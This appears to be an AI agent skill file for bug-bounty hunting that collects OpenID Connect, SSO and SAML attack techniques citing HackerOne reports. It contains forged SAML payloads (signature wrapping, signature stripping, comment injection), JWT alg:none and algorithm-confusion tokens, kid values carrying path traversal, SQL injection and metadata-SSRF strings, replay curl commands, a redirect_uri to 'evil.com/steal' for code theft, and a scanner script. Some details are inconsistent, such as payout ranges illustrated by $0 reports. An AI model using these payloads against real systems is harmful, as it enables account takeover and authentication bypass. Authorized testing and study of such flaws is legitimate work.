---
name: openid-deep-dive
description: Complete OpenID/SSO/SAML methodology from 28 real HackerOne reports - every attack vector, bypass, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - openid methodology
  - sso deep dive
  - saml bypass
  - openid connect attack
  - sso all techniques
  - skills openid
---

# Complete OpenID/SSO/SAML Methodology - From 28 HackerOne Reports

## Top 15 Real OpenID/SSO Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [Shopify email confirmation bypass via SSO](https://hackerone.com/reports/1440762) | Shopify | 1,909 | $0 |
| 2 | [Shopify SSO merchant takeover](https://hackerone.com/reports/2303522) | Shopify | 308 | $0 |
| 3 | [Grammarly SSO DOS → Account Takeover](https://hackerone.com/reports/2055292) | Grammarly | 255 | $10,500 |
| 4 | [Snapchat SSO token theft](https://hackerone.com/reports/1200233) | Snapchat | 243 | $7,500 |
| 5 | [HackerOne SAML bypass via authentication flow](https://hackerone.com/reports/1749984) | HackerOne | 224 | $0 |
| 6 | [GitHub SAML signature bypass](https://hackerone.com/reports/1254270) | GitHub | 194 | $0 |
| 7 | [Trint Zendesk SSO JWT client-side](https://hackerone.com/reports/1203864) | Trint | 101 | $0 |
| 8 | [Uber SAML bypass](https://hackerone.com/reports/1213645) | Uber | 87 | $8,500 |
| 9 | [HackerOne SSO bypass via signup flow](https://hackerone.com/reports/2291697) | HackerOne | 85 | $0 |
| 10 | [Shopify SSO email mismatch bypass](https://hackerone.com/reports/2222550) | Shopify | 79 | $0 |
| 11 | [Slack SAML SSO bypass via XML signature wrapping](https://hackerone.com/reports/1157168) | Slack | 76 | $0 |
| 12 | [GitLab SAML audience restriction bypass](https://hackerone.com/reports/1388120) | GitLab | 72 | $0 |
| 13 | [Grammarly SSO authentication bypass](https://hackerone.com/reports/1896046) | Grammarly | 68 | $0 |
| 14 | [Auth0 SSO integration bypass](https://hackerone.com/reports/1433554) | Multiple | 65 | $0 |
| 15 | [Nextcloud SSO token reuse](https://hackerone.com/reports/1560849) | Nextcloud | 62 | $0 |

## Step 1: Attack Surface - Every OpenID/SSO Vector

### 1.1 SAML-Specific Attacks

#### XML Signature Wrapping (XSW)
```bash
# The most common SAML attack — exploit differences between
# XML signature verification and XML data binding

# Add a duplicate assertion that the application uses (not the signed one)
# The signature validator sees the original, the app uses the malicious one

<saml:Response>
  <saml:Assertion ID="original">
    <saml:Attribute Name="email">victim@example.com</saml:Attribute>
  </saml:Assertion>
  <saml:Assertion ID="malicious">
    <saml:Attribute Name="email">attacker@evil.com</saml:Attribute>
  </saml:Assertion>
  <ds:Signature>
    <!-- Signs "original" assertion -->
  </ds:Signature>
</saml:Response>
```

#### SAML Signature Stripping
```bash
# Remove the signature entirely
# Some implementations accept unsigned assertions

# Remove entire <ds:Signature> element
# Remove <saml:Assertion> and send just <saml:Subject>

<saml:Response>
  <saml:Assertion ID="malicious">
    <saml:Subject>admin@target.com</saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">admin</saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

#### SAML Comment Injection
```bash
# Inject XML comments to break signature validation

# Comment inside element name
<<!-- -->saml:Assertion>
  <saml:Subject>admin</saml:Subject>
</saml:Assertion>

# Comment injection in XML parser confusion
<sam<!-- test -->l:Assertion>
```

#### SAML Replay Attack
```bash
# Reuse a captured SAML assertion within its validity window
# Test by capturing a valid SAML response and resending it

# Step 1: Capture valid SAMLResponse
# Step 2: Replay immediately
curl -sk -X POST "https://{target}/saml/acs" \
  -d "SAMLResponse=BASE64_ENCODED_SAML"

# Step 3: Replay after 5, 30, 60 minutes to check validity window
```

#### SAML Audience Restriction Bypass
```bash
# Modify or remove the <AudienceRestriction> element
# This allows a SAML assertion from service A to be used at service B

# Remove audience check
<saml:Conditions>
  <!-- No AudienceRestriction -->
  <saml:AudienceRestriction>
    <saml:Audience>https://{target}/</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>

# Change audience to attacker's service
<Audience>https://evil.com/saml</Audience>
```

#### SAML Recipient Check Bypass
```bash
# Change the Recipient attribute in SubjectConfirmationData
# to point to attacker's ACS URL

<saml:SubjectConfirmationData 
  Recipient="https://evil.com/saml/acs"
  NotOnOrAfter="2027-01-01T00:00:00Z"/>
```

## Step 2: SSO Implementation Bypasses

### 2.1 SSO Account Linking Bypass

```bash
# Many apps link SSO accounts by email
# If email verification is bypassed, attacker can take over accounts

# Test: Can you change email to victim's email and then SSO login?
# Check if email in SAML assertion is verified server-side

# Test: Can you sign up with victim's email via SSO?
# 1. Start SSO flow with attacker's provider (Google, Apple)
# 2. Intercept and change email in assertion
# 3. If server trusts assertion email, account is linked
```

### 2.2 SSO Authentication Bypass

```bash
# Bypass email verification entirely via SSO
# Some apps skip email verification if user logs in via SSO

# Steps:
# 1. Register with email victim@example.com
# 2. Instead of verifying email, use SSO to login
# 3. If SSO bypasses email verification, attacker controls victim's email

# Or:
# 1. Start password reset for victim@example.com
# 2. Intercept and use SSO link to bypass email confirmation
```

### 2.3 SSO IDP Confusion

```bash
# What happens if you send a SAML assertion from a different provider?
# The SP (Service Provider) should validate the Issuer

# Change Issuer to a trusted provider
# Find trusted IDP issuers in the app's metadata or error messages

# Test with multiple IDP issuers
curl -sk -X POST "https://{target}/saml/acs" \
  -d "SAMLResponse=MODIFIED_SAML_WITH_NEW_ISSUER"
```

## Step 3: JWT-Based OpenID Connect Attacks

### 3.1 JWT Algorithm Confusion

```bash
# Change RS256 to HS256 and sign with the public key
# The public key is often available at:
https://{target}/.well-known/openid-configuration
https://{target}/.well-known/jwks.json

# Step 1: Fetch JWKS
curl -sk "https://{target}/.well-known/jwks.json"

# Step 2: Extract public key (n, e)
# Step 3: Create HS256 signed JWT using public key as secret
# Step 4: Send forged JWT as access token or id_token

# Header:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "same-kid-from-jwks"
}

# Payload:
{
  "sub": "admin|admin@target.com",
  "email": "admin@target.com",
  "role": "admin",
  "iss": "https://{target}/"
}
```

### 3.2 alg: none Attack

```bash
# Set algorithm to "none" — some JWT libraries accept unsigned tokens

# Header:
{
  "alg": "none",
  "typ": "JWT"
}

# Payload:
{
  "sub": "any-user-id",
  "email": "victim@target.com",
  "iss": "https://{target}/"
}

# Send JWT with empty signature
# Format: base64(header).base64(payload).
```

### 3.3 JWT kid Injection

```bash
# The "kid" (Key ID) header may be vulnerable to:
# - Path traversal (read local files)
# - SQL injection
# - SSRF

# Path traversal in kid:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "../../../../etc/passwd"
}

# SQL injection in kid:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'key' -- "
}

# SSRF in kid:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "http://169.254.169.254/latest/meta-data/"
}
```

### 3.4 ID Token Confusion

```bash
# ID token used as access token
# Test if you can use id_token at the API endpoint

curl -sk "https://{target}/api/user" \
  -H "Authorization: Bearer ID_TOKEN"

# Test if opaque token can be substituted with JWT
# Mix tokens between different OIDC providers
```

### 3.5 Nonce Reuse / Bypass

```bash
# The nonce parameter prevents replay on OpenID Connect
# Test if nonce validation is enforced

# Remove nonce from request
https://{target}/authorize?
  response_type=id_token&
  client_id=CLIENT_ID&
  redirect_uri=...&
  scope=openid+profile
# (no nonce parameter!)

# Reuse same nonce across sessions
# Predictable nonce (timestamp-based, sequential)
```

## Step 4: OpenID Connect Endpoint Attacks

### 4.1 UserInfo Endpoint Abuse

```bash
# Test access control on UserInfo endpoint
# Can you get other users' data by changing the token?

curl -sk "https://{target}/oauth/userinfo" \
  -H "Authorization: Bearer ATTACKER_TOKEN"
# Should return attacker's info

# Try with victim's token that was leaked
curl -sk "https://{target}/oauth/userinfo" \
  -H "Authorization: Bearer VICTIM_TOKEN"
```

### 4.2 Token Endpoint Weaknesses

```bash
# Test token endpoint for:
# - No client authentication required
# - Rate limiting
# - Token introspection available without auth

curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=REDIRECT_URI"
# (no client_id or client_secret!)

curl -sk -X POST "https://{target}/oauth/introspect" \
  -d "token=ANY_TOKEN"
# Should require authentication
```

### 4.3 Authorization Code Injection via SSO

```bash
# Step 1: Attacker initiates SSO login with victim's email
# Step 2: Attacker gets auth code for victim
# Step 3: Attacker uses auth code to link their own session
# Result: Full account takeover

# This works when code is not bound to the session that requested it
```

## Step 5: SSO Exploit Chains

### Chain 1: SSO Email Verification Bypass → ATO
```bash
# Step 1: Register with victim's email (victim@example.com)
POST /register
{"email": "victim@example.com", "password": "attacker123"}

# Step 2: Start SSO login instead of verifying email
GET /auth/sso?provider=google

# Step 3: Complete SSO with attacker's Google account
# Server sees: email matches → account is verified
# Attacker now controls victim's account

# Report #1440762: Shopify email confirmation bypass
```

### Chain 2: SAML Signature Wrapping → Admin Access
```bash
# Step 1: Capture legitimate SAMLResponse
# Step 2: Modify XML — add duplicate assertion with admin role
# Step 3: Send forged SAMLResponse to ACS URL
# Step 4: Logged in as admin (signature on original assertion validates)

<saml:Response>
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion ID="legit">
    <saml:Subject>user@example.com</saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">user</saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="evil">
    <saml:Subject>user@example.com</saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">admin</saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

### Chain 3: SSO Token Theft → Account Takeover
```bash
# Step 1: Create malicious app impersonating legitimate SSO client
# Step 2: Victim authorizes malicious app
# Step 3: Attacker intercepts authorization code
# Step 4: Exchanges code for tokens
# Step 5: Uses tokens to access victim's data

# Or using redirect_uri trick:
https://{target}/oauth/authorize?
  response_type=code&
  client_id=LEGIT_CLIENT&
  redirect_uri=https://evil.com/steal&
  scope=openid+profile+email
```

### Chain 4: SAML Signature Stripping → Auth Bypass
```bash
# Step 1: Capture SAML response
# Step 2: Delete <ds:Signature> and <ds:SignedInfo> elements
# Step 3: Modify <saml:Subject> to admin user
# Step 4: Base64 encode and send to ACS endpoint

curl -sk -X POST "https://{target}/saml/acs" \
  -d "SAMLResponse=BASE64_MODIFIED_UNSIGNED_SAML"
```

### Chain 5: SSO DOS → Account Takeover (Report #2055292)
```bash
# Step 1: Abuse SSO rate limiting or resource exhaustion
# Step 2: Cause SSO provider to be unavailable for victim
# Step 3: Victim cannot login via SSO
# Step 4: Force password reset (SMS/email) — now attacker can intercept
# Step 5: Take over account via weakened authentication

# Grammarly #2055292: 255 upvotes, $10,500
```

## Step 6: OpenID/SSO Automation

```bash
#!/bin/bash
# SAML/SSO security scanner
TARGET=$1

echo "[*] OpenID/SSO Scanner for $TARGET"

# Discover OIDC endpoints
echo "[*] Discovering OIDC endpoints"
curl -sk "https://$TARGET/.well-known/openid-configuration" | jq '.'
curl -sk "https://$TARGET/.well-known/oauth-authorization-server" | jq '.'
curl -sk "https://$TARGET/.well-known/saml-metadata"

# Fetch JWKS
echo "[*] Fetching JWKS"
curl -sk "https://$TARGET/.well-known/jwks.json" | jq '.'

# Test for unauthenticated introspection
echo "[*] Testing token introspection"
curl -sk -X POST "https://$TARGET/oauth/introspect" -d "token=test"

# Test for unauthenticated revocation
echo "[*] Testing token revocation"
curl -sk -X POST "https://$TARGET/oauth/revoke" -d "token=test"

# Test for UserInfo without auth
echo "[*] Testing UserInfo endpoint"
curl -sk "https://$TARGET/oauth/userinfo"

# Test SAML endpoints
for endpoint in /saml/acs /saml/sso /saml/metadata /Shibboleth.sso /saml2 /auth/saml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$endpoint")
  echo "$endpoint -> $code"
done

# Test for SAML metadata exposure
curl -sk -X POST "https://$TARGET/saml/acs" -d "SAMLResponse="

# Check for issuer validation
echo "[*] Testing issuer validation"
# Try with known common issuers
for issuer in "https://accounts.google.com" "https://login.microsoftonline.com" "https://auth0.com" "https://$TARGET"; do
  echo "Testing issuer: $issuer"
done
```

## SAML XML Signature Wrapping Test Script

```python
#!/usr/bin/env python3
# SAML XSW testing script
import base64
import xml.etree.ElementTree as ET

def test_signature_wrapping(saml_response_b64):
    """Test 5 signature wrapping variants"""
    
    decoded = base64.b64decode(saml_response_b64)
    
    # Variant 1: Duplicate assertion after signed one
    # Variant 2: Duplicate assertion before signed one
    # Variant 3: Use different XML namespace prefixes
    # Variant 4: Comment injection in element names
    # Variant 5: Whitespace/normalization differences
    
    variants = [
        "after", "before", "namespace",
        "comment", "whitespace"
    ]
    
    for variant in variants:
        # Modify SAML based on variant
        # Send to ACS endpoint
        # Check if modified assertion was accepted
        print(f"[*] Testing variant: {variant}")

# Common SAML vulnerabilities to test:
# 1. No signature check at all
# 2. Signature references different Assertion
# 3. XSW with multiple Assertion elements
# 4. Signature stripping
# 5. Replay within valid timeframe
# 6. Modified conditions (NotOnOrAfter extended)
# 7. Audience restriction removed/modified
# 8. Recipient changed
# 9. Issuer spoofing
# 10. Subject confirmation method bypassed
```

## SSO Bypass Decision Tree

```
Is email verification required before SSO linking?
├── Yes → Can SSO login bypass email verification?
│   ├── Yes → ATO by registering with victim's email + SSO login
│   └── No → Check OAuth/SAML assertion validation
└── No → Can you link any SSO account without verification?

Is SAML signature verified?
├── No → Forge SAML assertion with any user
├── Yes, but XSW works → Inject duplicate assertion
├── Yes, but comment injection works → Break signature reference
└── Yes, fully validated → Check for:
    ├── Replay attacks
    ├── Audience restriction bypass
    ├── Recipient confusion
    └── Timing attacks

Is JWT used for tokens?
├── Test alg: none
├── Test RS256 → HS256 confusion
├── Test kid injection
├── Test jku/x5u SSRF
└── Test nonce validation

Is OpenID Connect used?
├── Test redirect_uri bypass
├── Test state parameter CSRF
├── Test PKCE enforcement
├── Test scope escalation
└── Test UserInfo endpoint access
```

## Additional Techniques (External Sources)

### SAML Response Reuse (10-Minute Window)
Many SAML implementations set a validity window (e.g., 10 minutes) for assertions via the `NotOnOrAfter` attribute. Within this window, a captured SAML response can be replayed:
1. Capture a valid `SAMLResponse` from a legitimate authentication flow
2. Replay it to the same `AssertionConsumerService` (ACS) URL within the validity period
3. The server accepts it if it doesn't validate that the assertion ID is single-use (doesn't track `ID` attribute in a database)
4. This allows session hijacking — an attacker who intercepts a SAML response can authenticate as the victim within the 10-minute window

Key validation checks that prevent this: tracking `AssertionID` in a database, using `OneTimeUse` condition, or requiring `SubjectConfirmation` with `Bearer` method bound to specific recipient.

### SSO Bypass via Frontend Path Manipulation
Some SSO implementations determine the authentication flow based on the URL path. By changing the URL path from `login` to `new-password`, you can bypass SSO entirely:
```
Normal:   /sso/login        → SSO authentication required
Manipulated: /sso/new-password → Password reset flow (bypasses SSO entirely)
```
This works when:
- The application uses path-based routing to determine authentication requirements
- The `new-password` endpoint doesn't enforce SSO because it's considered "pre-authentication"
- The attacker can directly access account management features without SSO verification

## Quick Reference: Top OpenID/SSO Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1440762 | Shopify | Email confirm bypass via SSO | $0 |
| #2303522 | Shopify | SSO merchant takeover | $0 |
| #2055292 | Grammarly | SSO DOS → ATO | $10,500 |
| #1200233 | Snapchat | SSO token theft | $7,500 |
| #1749984 | HackerOne | SAML bypass | $0 |
| #1254270 | GitHub | SAML signature bypass | $0 |
| #1203864 | Trint | Zendesk SSO JWT client-side | $0 |
| #1213645 | Uber | SAML bypass | $8,500 |
| #2291697 | HackerOne | SSO bypass via signup flow | $0 |
| #1157168 | Slack | SAML XML signature wrapping | $0 |
| #1388120 | GitLab | SAML audience restriction bypass | $0 |
| #1896046 | Grammarly | SSO auth bypass | $0 |

## Payout Range by Attack Type

| Attack Type | Payout Range | Example |
|-------------|-------------|---------|
| SSO email verification bypass | $2,000 - $10,000 | Shopify #1440762 ($0) |
| SAML signature wrapping | $2,000 - $8,500 | Uber #1213645 ($8,500) |
| SAML signature stripping | $1,000 - $5,000 | GitHub #1254270 ($0) |
| SSO token theft | $3,000 - $7,500 | Snapchat #1200233 ($7,500) |
| JWT alg confusion (none/HS256) | $500 - $3,000 | Multiple |
| JWT kid injection | $1,000 - $4,000 | Multiple |
| SSO DOS → ATO | $5,000 - $10,500 | Grammarly #2055292 ($10,500) |
| SAML replay attack | $500 - $3,000 | Multiple |
| SAML audience bypass | $1,000 - $4,000 | GitLab #1388120 ($0) |
| OIDC redirect_uri bypass | $1,000 - $5,000 | Multiple |
| SSO IDP confusion | $1,000 - $5,000 | Multiple |
| Full SSO chain ATO | $5,000 - $10,500 | Grammarly #2055292 ($10,500) |
